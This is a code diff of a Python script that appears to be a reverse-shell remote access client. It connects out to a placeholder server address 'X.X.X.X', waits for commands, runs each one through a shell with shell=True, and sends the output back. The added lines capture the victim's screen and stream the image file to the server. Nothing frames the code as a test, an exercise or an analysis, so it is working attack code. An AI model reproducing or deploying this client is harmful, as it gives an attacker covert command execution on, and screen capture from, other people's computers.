@@ -1,53 +1,55 @@
 import socket
-import threading
-import platform
-import subprocess
 import os
+import subprocess
+from PIL import ImageGrab
+import io
+
+BUFFER_SIZE = 4096  # 4KB chunks
+
+def send_large_file(client_socket, file_path):
+    try:
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+
+        # Send the file size first (4 bytes, big-endian)
+        file_size = len(file_data)
+        client_socket.send(file_size.to_bytes(4, byteorder='big'))
+
+        # Now send the actual file data
+        client_socket.sendall(file_data)
+    except Exception as e:
+        print(f"An error occurred while sending the file: {e}")
 
 def execute_command(command):
-    if platform.system().lower() == "windows":
-        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        return result.communicate()[0] + result.communicate()[1]
-    else:
-        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, executable="/bin/bash")
-        return result.communicate()[0] + result.communicate()[1]
+    try:
+        if command == "screenshot":
+            screenshot = ImageGrab.grab()
+            screenshot.save("screenshot.png", format="PNG")
+            return "screenshot.png"
+        else:
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            return output.decode()
+    except Exception as e:
+        return str(e).encode()
 
 def main():
-    host = "127.0.0.1"  # Change this to your server's IP address
-    port = 8888  # Use the same port number as the server
+    host = "X.X.X.X"  # The server IP address
+    port = 8888 # The server listening port
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
 
-    response = client_socket.recv(1024)
-    #print(response.decode())
-
-    receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
-    receive_thread.start()
-
-def receive_messages(client_socket):
     while True:
-        try:
-            data = client_socket.recv(4096)
-            if not data:
-                #print("Server closed the connection.")
-                break
-
-            command = data.decode()  # Received command from the server
-            result = execute_command(command)  # Execute the command
-            client_socket.send(result.encode())  # Send the output back to the server
-
-        except ConnectionError:
-            #print("Error: Connection to the server lost.")
+        command = client_socket.recv(1024).decode()
+        if command.lower() == "exit":
             break
+        result = execute_command(command)
+        if command == "screenshot":
+            send_large_file(client_socket, "screenshot.png")  # Update with the desired file path
+        else:
+            client_socket.send(result.encode())
 
-        except subprocess.CalledProcessError as e:
-            #print(f"Error executing command: {e}")
-            break
-
-        except Exception as e:
-            #print(f"An unexpected error occurred: {e}")
-            break
+    client_socket.close()
 
 if __name__ == "__main__":
     main()
